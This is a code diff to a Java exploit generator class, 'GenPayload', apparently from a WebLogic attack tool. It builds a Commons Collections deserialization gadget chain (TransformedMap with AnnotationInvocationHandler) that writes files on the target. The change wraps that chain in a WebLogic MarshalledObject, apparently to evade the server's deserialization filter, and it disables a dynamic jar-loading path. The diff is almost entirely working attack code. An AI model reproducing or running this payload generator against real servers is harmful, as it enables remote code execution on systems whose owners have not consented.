@@ -24,8 +24,8 @@ public class GenPayload
 	throws Exception
 	
 	{
-		if(true)
-			return (byte[])MTXLoadJar.doCallStaticMethod("GenPayload", "Gen", OS, ClassByte);
+//		if(true)
+//			return (byte[])MTXLoadJar.doCallStaticMethod("GenPayload", "Gen", OS, ClassByte);
 		String Path = "C:/windows/temp/1vBLBK.tmp";
 		if (!OS.equals("Windows"))
 		{
@@ -59,9 +59,9 @@ public class GenPayload
 		Map innermap = new HashMap();
 		innermap.put("value", "value");
 		
-		weblogic.corba.utils.MarshalledObject mso = new weblogic.corba.utils.MarshalledObject((Object)innermap);
 		
 		Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
+		
 		Class cls =
 		Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
 		Constructor ctor = cls.getDeclaredConstructor(new Class[]
@@ -71,7 +71,8 @@ public class GenPayload
 		{ Retention.class, outmap });
 		ByteArrayOutputStream bo = new ByteArrayOutputStream(10);
 		ObjectOutputStream out = new ObjectOutputStream(bo);
-		out.writeObject(instance);
+		weblogic.corba.utils.MarshalledObject mso = new weblogic.corba.utils.MarshalledObject((Object)instance);
+		out.writeObject(mso);
 		out.flush();
 		out.close();
 		return bo.toByteArray();
@@ -80,8 +81,8 @@ public class GenPayload
 	
 	public static byte[] DeleteFile(String OS) throws Exception
 	{
-		if(true)
-			return (byte[])MTXLoadJar.doCallStaticMethod("GenPayload", "DeleteFile", OS);
+//		if(true)
+//			return (byte[])MTXLoadJar.doCallStaticMethod("GenPayload", "DeleteFile", OS);
 		
 		String Path = "C:/windows/temp/1vBLBK.tmp";
 		if (!OS.equals("Windows"))
@@ -131,7 +132,8 @@ public class GenPayload
 		{ Retention.class, outmap });
 		ByteArrayOutputStream bo = new ByteArrayOutputStream(10);
 		ObjectOutputStream out = new ObjectOutputStream(bo);
-		out.writeObject(instance);
+		weblogic.corba.utils.MarshalledObject mso = new weblogic.corba.utils.MarshalledObject((Object)instance);
+		out.writeObject(mso);
 		out.flush();
 		out.close();
 		return bo.toByteArray();
